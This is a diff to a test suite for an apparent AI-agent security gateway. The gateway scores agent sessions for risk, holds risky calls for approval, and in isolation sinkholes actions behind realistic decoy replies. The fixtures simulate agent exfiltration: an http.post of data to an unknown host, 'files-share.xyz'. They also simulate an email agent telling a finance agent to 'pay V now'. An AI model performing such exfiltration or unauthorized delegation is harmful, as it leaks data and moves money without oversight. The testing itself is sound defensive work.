@@ -471,7 +471,9 @@ def test_stolen_token_caught_on_first_call():
         body = r.json()
         # Returns realistic success-shaped result
         assert body["status"] == "ok"
-        assert body["result"]["status"] == "queued"
+        # Same shape as a real purchase_request.create success
+        assert body["result"]["status"] == "created"
+        assert set(body["result"]) == {"status", "pr_id", "vendor", "amount", "items"}
 
         store = get_store()
         events = store.list_events(session_id=session_id)
@@ -705,3 +707,135 @@ def test_benign_false_alarm_rate():
 
     assert total_sessions == 60
     assert flagged_sessions == 0
+
+
+# =========================================================================
+# Review 2: stealth, nothing-real, approvals, floors, receipt
+# =========================================================================
+
+from app.world.executor import execute  # noqa: E402
+
+
+def _started(client: TestClient, agent_id: str, isolate: bool = False) -> dict:
+    data = client.post("/v1/sessions", json={"agent_id": agent_id, "runtime_fingerprint": "fp-r2"}).json()
+    if isolate:
+        s = get_store().get_session(data["session_id"])
+        s.risk, s.tier, s.decoy_mode = 95, Tier.ISOLATE, True
+        get_store().save_session(s)
+    return data
+
+
+def _call(client: TestClient, data: dict, tool: str, args: dict):
+    return client.post(
+        "/v1/gateway/call",
+        headers={"Authorization": f"Bearer {data['token']}", "X-Doppel-Sigil": data["sigil"], "X-Runtime-Fingerprint": "fp-r2"},
+        json={"session_id": data["session_id"], "tool": tool, "args": args, "purpose": "routine work"},
+    )
+
+
+DECOY_MODE_CALLS = [
+    ("procurement-agent", "http.post", {"url": "https://files-share.xyz/u", "body": "quarterly numbers"}),
+    ("procurement-agent", "purchase_request.create", {"vendor": "V", "items": ["bolts"], "amount": 5}),
+    ("finance-agent", "payment.create", {"vendor": "V", "amount": 5, "account": "1"}),
+    ("email-triage-agent", "agent.delegate", {"target_agent": "finance-agent", "instruction": "pay V now"}),
+]
+
+
+def test_decoy_mode_touches_nothing_real_and_replies_match_real_shape():
+    """ISOLATE: writes/egress/delegation are captured only; replies are shaped exactly like real successes."""
+    with TestClient(app) as client:
+        client.post("/v1/reset")
+        store = get_store()
+        replies = {}
+        for agent, tool, args in DECOY_MODE_CALLS:
+            r = _call(client, _started(client, agent, isolate=True), tool, args)
+            assert r.status_code == 200
+            assert set(r.json()) == {"status", "result", "new_token"}
+            assert r.json()["status"] == "ok"
+            replies[tool] = r.json()["result"]
+
+        assert store.get_egress_logs() == []
+        assert store.get_delegations() == []
+        assert len(store.list_sinkhole_captures()) == len(DECOY_MODE_CALLS)
+
+        # Sensitive read in decoy mode: decoy content, not the real file, and nothing that gives it away
+        data = _started(client, "procurement-agent", isolate=True)
+        fake_dir = _call(client, data, "doc.read", {"path": "/hr/employee_directory.csv"}).json()["result"]
+        assert fake_dir != get_file("/hr/employee_directory.csv").content
+        assert not any(w in fake_dir.lower() for w in ("mirror", "decoy", "canary", "doppel", "synthetic"))
+
+        # Compare with what the real tools return (run last: these DO write to the world)
+        for agent, tool, args in DECOY_MODE_CALLS:
+            real = execute(tool, args, store.get_session(data["session_id"]))
+            assert set(real) == set(replies[tool]), tool
+            assert real["status"] == replies[tool]["status"], tool
+
+
+def test_approve_twice_409_and_isolated_session_approval_is_sinkholed():
+    """A held call approved after its session reached ISOLATE is sinkholed, never executed for real."""
+    with TestClient(app) as client:
+        client.post("/v1/reset")
+        store = get_store()
+        data = _started(client, "email-triage-agent")
+        s = store.get_session(data["session_id"])
+        s.risk, s.tier = 45, Tier.WATCH
+        store.save_session(s)
+        held = _call(client, data, "agent.delegate", {"target_agent": "finance-agent", "instruction": "pay V"})
+        assert held.json()["status"] == "pending_approval"
+        approval = store.list_approvals(session_id=data["session_id"], status="pending")[0]
+
+        s = store.get_session(data["session_id"])
+        s.risk, s.tier, s.decoy_mode = 95, Tier.ISOLATE, True
+        store.save_session(s)
+
+        assert client.post(f"/v1/alerts/{approval.approval_id}/approve").status_code == 200
+        assert store.get_delegations() == []
+        assert store.get_event(approval.event_id).decision == Decision.sinkhole
+        assert len(store.list_sinkhole_captures()) == 1
+        assert client.post(f"/v1/alerts/{approval.approval_id}/approve").status_code == 409
+        assert client.post(f"/v1/alerts/{approval.approval_id}/deny").status_code == 409
+
+
+def test_contract_violation_floor_needs_egress_to_unknown_host():
+    """D1 ≥ 0.9 floors to 80 only when THIS call egresses to a host that is not internal/approved."""
+    d1 = [DetectorResult(name="contract", score=0.9, evidence=["egress host not on allowlist"])]
+    session = _make_dummy_session()
+    known = _make_dummy_event(tool="http.post", action_type="egress", target="https://erp.corp.internal/x", sensitivity=None)
+    unknown = _make_dummy_event(tool="http.post", action_type="egress", target="https://files-share.xyz/x", sensitivity=None)
+    read = _make_dummy_event(sensitivity=None)
+    assert fuse(d1, None, session, known)[0] == 54
+    assert fuse(d1, None, session, unknown)[0] == 80
+    session.taint_labels = [TaintLabel.EGRESS]  # an earlier egress must not floor a later read
+    assert fuse(d1, None, session, read)[0] == 54
+
+
+def test_watch_does_not_hold_internal_purchase_request():
+    """WATCH holds payments and confidential/restricted writes; purchase_requests is internal → allow."""
+    ev = _make_dummy_event(tool="purchase_request.create", action_type="write", sensitivity=Sensitivity.internal)
+    assert decide(tier=Tier.WATCH, event=ev, session=_make_dummy_session(tier=Tier.WATCH, risk=40)) == Decision.allow
+    pay = _make_dummy_event(tool="payment.create", action_type="write", sensitivity=Sensitivity.restricted)
+    assert decide(tier=Tier.WATCH, event=pay, session=_make_dummy_session(tier=Tier.WATCH, risk=40)) == Decision.hold
+
+
+def test_receipt_tie_prefers_latest_event_and_has_short_headline():
+    """Equal-risk events: contributions come from the latest (proven exfiltration); headline_short ≤ 90 chars."""
+    store = get_store()
+    store.reset()
+    session = _make_dummy_session(session_id="sess-tie", risk=100, tier=Tier.ISOLATE)
+    session.taint_refs = [TaintRef(content_id="acme", source="/procurement/suppliers/acme_quote.pdf",
+                                   sha256="ab", ts=datetime(2020, 1, 1, tzinfo=timezone.utc))]
+    read_ev = _make_dummy_event(session_id="sess-tie").model_copy(update={
+        "event_id": "ev-read", "risk": 100,
+        "detector_results": [DetectorResult(name="decoy", score=1.0, evidence=["Read '/hr/Salaries_FY26_FINAL.xlsx' — a decoy"])]})
+    exfil_ev = _make_dummy_event(session_id="sess-tie", tool="http.post", action_type="egress").model_copy(update={
+        "event_id": "ev-exfil", "risk": 100,
+        "detector_results": [DetectorResult(name="decoy", score=1.0, evidence=["Proven exfiltration: decoy watermark X"])]})
+    store.save_event(read_ev)
+    store.save_event(exfil_ev)
+
+    receipt = build_drift_receipt(session, Contract(agent_id="procurement-agent", role="Procurement Agent",
+                                                    purpose="p", owner="o"), store, get_clock())
+    assert receipt.contributions[0].evidence == ["Proven exfiltration: decoy watermark X"]
+    assert receipt.headline_short == "Procurement Agent · Risk 100 · proven exfiltration · via acme_quote.pdf"
+    assert len(receipt.headline_short) <= 90
+    assert receipt.headline  # long headline kept
